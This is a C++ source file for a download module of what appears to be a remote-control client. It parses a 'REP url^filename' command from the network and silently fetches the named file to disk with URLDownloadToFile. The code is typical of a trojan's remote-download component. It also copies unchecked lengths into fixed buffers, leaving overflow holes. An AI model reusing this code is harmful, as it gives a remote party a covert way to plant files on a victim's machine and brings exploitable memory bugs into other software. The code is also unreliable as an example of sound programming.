#include <urlmon.h>
#pragma comment (lib,"urlmon.lib")
#include "Download.h"

CDownload::CDownload(CClient *pClient):CBasicManager(pClient)
{
	

}
CDownload::~CDownload()
{

}

void CDownload::OnReceive(LPBYTE lpBuff,DWORD dwSize)
{
	int i;
	for (i=0;i<dwSize;i++)
	{
		if(lpBuff[0]=='R'&&lpBuff[1]=='E'&&lpBuff[2]=='P')break;
		lpBuff++;

	}
	if (i==dwSize)
	{
		printf("NOT FOUND\n");
		return;
	}

	printf("\t%s\n",lpBuff);
	char strUrlandName[10240];
	memcpy(strUrlandName,lpBuff+3,dwSize);

	if(memcmp(strUrlandName,"donothing^donothing",10)==0)return;

	char* temp=strchr(strUrlandName,'^');
	if(!temp)return;

	char url[256];
	char filename[256];
	int lstrUrlandName=strlen(strUrlandName);
	int ltemp=strlen(temp);

	memcpy(url,strUrlandName,lstrUrlandName-ltemp);
	memcpy(filename,temp+1,ltemp-1);
	url[lstrUrlandName-ltemp]='\0';
	filename[ltemp-1]='\0';
	printf("url:%s\nfilename:%s\n",url,filename);
	URLDownloadToFile(NULL,url,filename,NULL,NULL);
}